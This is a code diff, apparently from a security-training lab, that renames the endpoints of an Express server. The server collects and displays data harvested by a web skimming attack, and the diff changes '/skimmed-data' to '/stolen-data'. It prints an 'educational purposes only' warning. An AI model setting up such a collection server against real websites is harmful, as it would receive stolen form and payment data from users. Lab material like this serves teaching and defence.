@@ -37,7 +37,7 @@ let stats = {
 /**
  * Data Collection Endpoint
  */
-app.post('/skimmed-data', async (req, res) => {
+app.post('/stolen-data', async (req, res) => {
   try {
     const timestamp = new Date().toISOString()
     const clientIP = req.ip || req.connection.remoteAddress
@@ -560,8 +560,8 @@ app.get('/', async (req, res) => {
   }
 })
 
-// Also serve dashboard at /skimmed-data for nginx proxy (similar to Lab 2's /stolen-data)
-app.get('/skimmed-data', async (req, res) => {
+// Also serve dashboard at /stolen-data for nginx proxy (matching Lab 2)
+app.get('/stolen-data', async (req, res) => {
   try {
     const dashboardPath = path.join(__dirname, 'dashboard.html')
     const dashboard = await fs.readFile(dashboardPath, 'utf8')
@@ -580,7 +580,7 @@ app.listen(PORT, () => {
   console.log('═'.repeat(60))
   console.log(`📡 Server running on: http://localhost:${PORT}`)
   console.log(`📊 Status dashboard: http://localhost:${PORT}/status`)
-  console.log(`💾 Data endpoint: POST http://localhost:${PORT}/skimmed-data`)
+  console.log(`💾 Data endpoint: POST http://localhost:${PORT}/stolen-data`)
   console.log(`📁 Export data: GET http://localhost:${PORT}/export/YYYY-MM-DD`)
   console.log('═'.repeat(60))
   console.log('⚠️  FOR EDUCATIONAL PURPOSES ONLY')
